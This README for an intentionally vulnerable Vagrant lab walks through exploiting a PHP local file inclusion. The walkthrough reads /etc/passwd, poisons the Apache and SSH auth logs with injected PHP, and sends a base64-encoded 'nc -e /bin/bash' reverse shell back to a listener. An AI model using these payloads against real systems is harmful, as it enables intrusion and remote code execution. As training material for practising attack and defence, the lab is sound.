# lab-hack-lfi

This is a laboratory to work with the [LFI (Local File Inclusion)](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#Local_file_inclusion) vulnerability. This Vagrant box is intentionally vulnerable. It hosts an LFI vulnerable website built in PHP and the filesystem permissions were modified to allow user `www-data` to read the Apache 2 and auth logfiles. The application is composed by two files, a vulnerable `index.php` file who uses the `include` statement to import another file defined in the request URL's `filename` parameter. The file to import is `hello.php` which prints a `Hello world!` message in the website. Test it visiting http://10.10.10.10/index.php?filename=hello.php.

The goal of this laboratory is to get a shell session as the `www-data user` exploiting an LFI vulnerability and using Log Poisoning.

| Machine name | lab-hack-lfi               |
| ------------ | -------------------------- |
| IP address   | 10.10.10.10                |
| OS           | Debian GNU/Linux 10 Buster |

Download and start the virtual machine:

```
$ git clone https://gitlab.com/josebamartos/lab-hack-lfi
$ cd lab-hack-lfi
$ vagrant up
```

Test if including files works:

```
$ curl http://10.10.10.10/index.php?filename=hello.php
Hello world!
```

Try to include another system file:

```
$ curl http://10.10.10.10/index.php?filename=/etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
vagrant:x:1000:1000:vagrant,,,:/home/vagrant:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
memcache:x:106:113:Memcached,,,:/nonexistent:/bin/false
postfix:x:107:115::/var/spool/postfix:/usr/sbin/nologin
vboxadd:x:998:2::/var/run/vboxadd:/sbin/nologin
```

Check if logs can be accessed:

```
$ curl http://10.10.10.10/index.php?filename=/var/log/apache2/access.log
10.10.10.1 - - [29/Jan/2022:09:10:32 +0000] "GET /index.php?filename=hello.php HTTP/1.1" 200 160 "-" "curl/7.81.0"
10.10.10.1 - - [29/Jan/2022:09:10:48 +0000] "GET /index.php?filename=/etc/passwd HTTP/1.1" 200 1734 "-" "curl/7.81.0"
```
Try to inject PHP in the user agent:

```
$ curl -H "User-Agent: <?php system('whoami') ?>" http://10.10.10.10/index.php?filename=hello.php
```

Check if the website interprets the PHP code when showing the log file contents:

```
10.10.10.1 - - [29/Jan/2022:09:10:32 +0000] "GET /index.php?filename=hello.php HTTP/1.1" 200 160 "-" "curl/7.81.0"
10.10.10.1 - - [29/Jan/2022:09:10:48 +0000] "GET /index.php?filename=/etc/passwd HTTP/1.1" 200 1734 "-" "curl/7.81.0"
$ curl http://10.10.10.10/index.php?filename=/var/log/apache2/access.log
10.10.10.1 - - [29/Jan/2022:09:12:27 +0000] "GET /index.php?filename=hello.php HTTP/1.1" 200 160 "-" "www-data
```

It does! You can see `www-data` at the end of the last line.

Another place where PHP code can be injected is in `/var/log/auth`. If you can read this file using LFI, you can try to inject PHP code in the username part of a SSH login request. Do this using a wrong password, it doesn't matter.

```
$ ssh "<?php system('pwd'); ?>"@10.10.10.10
```

Read the logfile:

```
$ curl http://10.10.10.10/index.php?filename=/var/log/auth.log
```

```
[...]
Jan 29 09:18:56 debian10 sshd[12121]: Invalid user /var/www/html
 from 10.10.10.1 port 51018
Jan 29 09:18:57 debian10 sshd[12121]: Failed none for invalid user /var/www/html
 from 10.10.10.1 port 51018 ssh2
Jan 29 09:18:58 debian10 sshd[12121]: Connection closed by invalid user /var/www/html
 10.10.10.1 port 51018 [preauth]
```

It also worked! You can see `/var/www/html` path after each "invalid user" string.

We will use this technique to send a reverse shell against our local machine. In a new terminal window, use `netcat` to listen for TCP connections:

```
$ nc -nlvp 8080
```

Now, we will inject PHP code into `/var/log/auth.log` file using the SSH login, this code will open a reverse shell connection against your workstation when you visit http://10.10.10.10/index.php?filename=/var/log/auth.log.

This is the command we want to run inject to the logfile:
 
```
$ echo "nc -e /bin/bash 10.10.10.1 8080"
```

We can try to inject it as we did with `pwd` but the syntax of the new one is more complex and characters like whitespaces and symbols can truncate it before arriving to the server. To ensure command's integrity we sill send it in base64.

First of all, you must encode the reverse shell command in base64 to ensure it arrives correctly to the server.

```
$ echo "nc -e /bin/bash 10.10.10.1 8080" | base64
bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjEwLjEgODA4MAo=
```

You can directly run code in base64 decoding it and sending it to bash. Don´t run this, it's just for clarification.

```
$ echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjEwLjEgODA4MAo | base64 -d | bash
```

Inject the command using the SSH login.

```
$ ssh '<?php system("echo bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjEwLjEgODA4MAo | base64 -d | bash") ?>'@10.10.10.10
```

The reverse shell will arrive to the terminal window where netcat is listening:

```
$ nc -nlvp 8080
Connection from 10.10.10.10:54070
whoami
www-data
```

Voilà !
